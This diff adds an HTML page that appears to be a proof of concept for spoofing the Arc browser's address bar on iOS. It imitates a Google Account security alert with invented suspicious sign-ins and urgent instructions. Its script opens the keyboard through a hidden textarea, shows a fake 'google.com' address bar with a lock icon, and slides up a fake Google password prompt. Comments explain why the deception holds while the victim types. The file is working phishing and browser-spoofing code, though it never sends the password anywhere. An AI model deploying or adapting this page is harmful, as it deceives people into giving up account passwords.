@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Google Account</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Segoe UI", sans-serif;
+    background: #fff;
+    color: #202124;
+  }
+
+  /* ── Top nav ── */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px;
+    border-bottom: 1px solid #e8eaed;
+    position: sticky;
+    top: 0;
+    background: #fff;
+    z-index: 10;
+  }
+  .topbar .logo { font-size: 22px; font-weight: 700; letter-spacing: -1px; }
+  .topbar .logo span:nth-child(1) { color: #4285F4; }
+  .topbar .logo span:nth-child(2) { color: #EA4335; }
+  .topbar .logo span:nth-child(3) { color: #FBBC05; }
+  .topbar .logo span:nth-child(4) { color: #4285F4; }
+  .topbar .logo span:nth-child(5) { color: #34A853; }
+  .topbar .logo span:nth-child(6) { color: #EA4335; }
+  .topbar .avatar {
+    width: 34px; height: 34px; border-radius: 50%;
+    background: #4285F4; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 600;
+  }
+
+  /* ── Alert banner ── */
+  .alert-banner {
+    background: #fce8e6;
+    border-left: 4px solid #EA4335;
+    padding: 14px 20px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+  }
+  .alert-banner .icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+  .alert-banner .text h3 { font-size: 15px; font-weight: 600; color: #c5221f; margin-bottom: 4px; }
+  .alert-banner .text p { font-size: 13px; color: #5f6368; line-height: 1.5; }
+
+  /* ── Content sections ── */
+  .section { padding: 24px 20px; border-bottom: 1px solid #f1f3f4; }
+  .section h2 { font-size: 16px; font-weight: 600; color: #202124; margin-bottom: 12px; }
+  .section p  { font-size: 14px; color: #5f6368; line-height: 1.7; margin-bottom: 10px; }
+
+  .activity-list { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+  .activity-list li {
+    display: flex; align-items: flex-start; gap: 12px;
+    background: #f8f9fa; border-radius: 10px; padding: 12px 14px;
+  }
+  .activity-list li .dot {
+    width: 8px; height: 8px; border-radius: 50%; background: #EA4335;
+    flex-shrink: 0; margin-top: 5px;
+  }
+  .activity-list li .detail { font-size: 13px; color: #3c4043; line-height: 1.5; }
+  .activity-list li .detail strong { display: block; font-size: 14px; color: #202124; }
+
+  .steps-list { list-style: none; counter-reset: steps; display: flex; flex-direction: column; gap: 14px; }
+  .steps-list li {
+    counter-increment: steps;
+    display: flex; gap: 14px; align-items: flex-start;
+  }
+  .steps-list li::before {
+    content: counter(steps);
+    width: 26px; height: 26px; border-radius: 50%;
+    background: #4285F4; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 13px; font-weight: 600; flex-shrink: 0;
+  }
+  .steps-list li .step-text { font-size: 14px; color: #3c4043; line-height: 1.6; padding-top: 3px; }
+
+  /* ── CTA section ── */
+  .cta-section {
+    padding: 28px 20px 40px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 14px;
+    text-align: center;
+  }
+  .cta-section p { font-size: 13px; color: #80868b; max-width: 300px; line-height: 1.6; }
+
+  .cta-btn {
+    width: 100%;
+    max-width: 340px;
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    border-radius: 24px;
+    padding: 15px 24px;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: inherit;
+    letter-spacing: 0.1px;
+    box-shadow: 0 1px 3px rgba(26,115,232,0.4);
+  }
+  .cta-btn:active { background: #1557b0; }
+
+  .dismiss-link {
+    font-size: 13px;
+    color: #5f6368;
+    text-decoration: underline;
+    cursor: pointer;
+    background: none;
+    border: none;
+    font-family: inherit;
+  }
+
+  /* ── Fake Arc / Chrome bottom address bar ── */
+  .fake-bar {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    background: #fff;
+    border-top: 0.5px solid rgba(0,0,0,0.18);
+    padding: 9px 16px 34px;
+    display: flex;
+    align-items: center;
+    z-index: 9999;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.15s ease;
+  }
+  .fake-bar.show { opacity: 1; visibility: visible; }
+
+  .fake-bar .bar-center {
+    position: absolute; left: 50%; transform: translateX(-50%);
+    display: flex; align-items: center; gap: 5px;
+  }
+  .fake-bar .bar-center .url-text {
+    font-size: 17px; font-weight: 400; color: #000;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    letter-spacing: -0.2px;
+  }
+  .fake-bar .bar-left  { display: flex; align-items: center; padding: 4px; }
+  .fake-bar .bar-right { margin-left: auto; display: flex; align-items: center; padding: 4px; }
+  .fake-bar svg.icon {
+    width: 20px; height: 20px; stroke: #007AFF; fill: none;
+    stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .fake-bar .lock-icon {
+    width: 11px; height: 11px; opacity: 0.55; margin-right: 1px;
+  }
+
+  /* ── Fake credential overlay (appears after spoof to show full attack chain) ── */
+  .cred-overlay {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    background: #fff;
+    border-radius: 20px 20px 0 0;
+    box-shadow: 0 -4px 24px rgba(0,0,0,0.15);
+    padding: 20px 24px 48px;
+    z-index: 9998;
+    transform: translateY(100%);
+    transition: transform 0.3s ease;
+    display: flex;
+    flex-direction: column;
+    gap: 16px;
+  }
+  .cred-overlay.show { transform: translateY(0); }
+
+  .cred-overlay .handle {
+    width: 36px; height: 4px; border-radius: 2px;
+    background: #dadce0; margin: 0 auto 4px;
+  }
+  .cred-overlay .co-logo { font-size: 18px; font-weight: 700; letter-spacing: -0.5px; text-align: center; }
+  .cred-overlay .co-logo span:nth-child(1) { color: #4285F4; }
+  .cred-overlay .co-logo span:nth-child(2) { color: #EA4335; }
+  .cred-overlay .co-logo span:nth-child(3) { color: #FBBC05; }
+  .cred-overlay .co-logo span:nth-child(4) { color: #4285F4; }
+  .cred-overlay .co-logo span:nth-child(5) { color: #34A853; }
+  .cred-overlay .co-logo span:nth-child(6) { color: #EA4335; }
+
+  .cred-overlay h3 { font-size: 20px; font-weight: 400; color: #202124; text-align: center; }
+  .cred-overlay .email-chip {
+    background: #f1f3f4; border-radius: 20px;
+    padding: 6px 14px; font-size: 14px; color: #3c4043;
+    display: flex; align-items: center; gap: 8px; align-self: center;
+  }
+  .cred-overlay .email-chip .dot {
+    width: 24px; height: 24px; border-radius: 50%;
+    background: #4285F4; color: #fff;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; font-weight: 600;
+  }
+
+  .cred-overlay .pw-field {
+    border: 1px solid #dadce0; border-radius: 6px;
+    padding: 12px 14px; font-size: 16px; color: #202124;
+    outline: none; font-family: inherit; width: 100%;
+  }
+  .cred-overlay .pw-field:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
+
+  .cred-overlay .next-btn {
+    background: #1a73e8; color: #fff; border: none;
+    border-radius: 6px; padding: 12px; font-size: 15px;
+    font-weight: 500; cursor: pointer; font-family: inherit;
+    width: 100%;
+  }
+</style>
+</head>
+<body>
+
+  <!-- Top navigation -->
+  <div class="topbar">
+    <div class="logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <div class="avatar">J</div>
+  </div>
+
+  <!-- Security alert banner -->
+  <div class="alert-banner">
+    <div class="icon">⚠️</div>
+    <div class="text">
+      <h3>Critical security alert</h3>
+      <p>We detected suspicious activity on your Google Account. Immediate action is required.</p>
+    </div>
+  </div>
+
+  <!-- Suspicious activity section -->
+  <div class="section">
+    <h2>Suspicious activity detected</h2>
+    <p>The following unusual sign-in attempts were made on your account in the last 24 hours:</p>
+    <ul class="activity-list">
+      <li>
+        <div class="dot"></div>
+        <div class="detail">
+          <strong>New device sign-in</strong>
+          Windows PC · Lagos, Nigeria · 2 hours ago
+        </div>
+      </li>
+      <li>
+        <div class="dot"></div>
+        <div class="detail">
+          <strong>Password change attempt</strong>
+          Blocked automatically · 45 minutes ago
+        </div>
+      </li>
+      <li>
+        <div class="dot"></div>
+        <div class="detail">
+          <strong>Recovery email access</strong>
+          Unauthorized attempt · 12 minutes ago
+        </div>
+      </li>
+    </ul>
+  </div>
+
+  <!-- What to do section -->
+  <div class="section">
+    <h2>What you need to do</h2>
+    <p>Follow these steps to immediately secure your account and prevent unauthorized access:</p>
+    <ul class="steps-list">
+      <li><div class="step-text">Verify it's really you by confirming your identity below.</div></li>
+      <li><div class="step-text">Review and revoke any suspicious connected apps or devices.</div></li>
+      <li><div class="step-text">Update your recovery phone number and email address.</div></li>
+    </ul>
+  </div>
+
+  <!-- Why this matters -->
+  <div class="section">
+    <h2>Why this matters</h2>
+    <p>Your Google Account contains your Gmail, Google Drive files, Photos, and payment methods. If an attacker gains access, they can read your emails, steal your files, and make purchases using your saved cards.</p>
+    <p>Google will never ask for your password via email or phone. This secure in-app verification is the only safe way to confirm your identity.</p>
+  </div>
+
+  <!-- CTA — sits below the fold so user must scroll, hiding the real address bar -->
+  <div class="cta-section">
+    <p>Tap below to verify your identity and immediately secure your account.</p>
+    <button class="cta-btn" id="secureBtn">Secure My Account</button>
+    <button class="dismiss-link">This wasn't me — dismiss alert</button>
+  </div>
+
+  <!-- Fake Chrome/Arc bottom address bar -->
+  <div class="fake-bar" id="fakeBar">
+    <div class="bar-left">
+      <svg class="icon" viewBox="0 0 24 24">
+        <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"/>
+        <polyline points="16 6 12 2 8 6"/>
+        <line x1="12" y1="2" x2="12" y2="15"/>
+      </svg>
+    </div>
+    <div class="bar-center">
+      <svg class="lock-icon" viewBox="0 0 24 24" fill="none" stroke="#3c3c43" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+      <span class="url-text">google.com</span>
+    </div>
+    <div class="bar-right">
+      <svg class="icon" viewBox="0 0 24 24">
+        <polyline points="23 4 23 10 17 10"/>
+        <path d="M20.5 15a9 9 0 1 1-2.1-9.4L23 10"/>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Fake Google credential overlay — slides up after address bar spoof to complete attack chain -->
+  <div class="cred-overlay" id="credOverlay">
+    <div class="handle"></div>
+    <div class="co-logo">
+      <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h3>Verify it's you</h3>
+    <div class="email-chip">
+      <div class="dot">J</div>
+      johndoe@gmail.com
+    </div>
+    <input class="pw-field" id="pwField" type="password" placeholder="Enter your password">
+    <button class="next-btn">Next</button>
+  </div>
+
+  <!-- Hidden textarea — focuses to open QWERTY keyboard (Arc iOS does not inject real URL into keyboard accessory bar) -->
+  <textarea id="kbTrigger" style="position:fixed;opacity:0;pointer-events:none;top:-999px;left:-999px;width:1px;height:1px;"></textarea>
+
+<script>
+  const fakeBar     = document.getElementById('fakeBar');
+  const credOverlay = document.getElementById('credOverlay');
+  const kbTrigger   = document.getElementById('kbTrigger');
+  const pwField     = document.getElementById('pwField');
+
+  let spoofActive = false;
+
+  function adjustBarHeight() {
+    const vv = window.visualViewport;
+    if (!vv) return;
+    const kbH = window.innerHeight - vv.height - vv.offsetTop;
+    fakeBar.style.bottom        = kbH > 50 ? kbH + 'px' : '0px';
+    fakeBar.style.paddingBottom = kbH > 50 ? '9px'      : '34px';
+  }
+
+  // Reposition fake bar whenever keyboard height changes
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener('resize', () => {
+      if (spoofActive) adjustBarHeight();
+    });
+  }
+
+  function showSpoof() {
+    spoofActive = true;
+    fakeBar.classList.add('show');
+    adjustBarHeight();
+
+    // Slide up credential sheet, then hand focus to password field.
+    // Arc iOS does not disclose the real origin in the keyboard accessory
+    // bar, so the spoof holds even while the user types their password.
+    setTimeout(() => {
+      credOverlay.classList.add('show');
+      setTimeout(() => pwField.focus(), 350);
+    }, 500);
+  }
+
+  document.getElementById('secureBtn').addEventListener('click', () => {
+    // Focus hidden textarea → QWERTY keyboard opens → Arc iOS shows no real URL
+    kbTrigger.focus();
+    setTimeout(showSpoof, 150);
+  });
+</script>
+
+</body>
+</html>
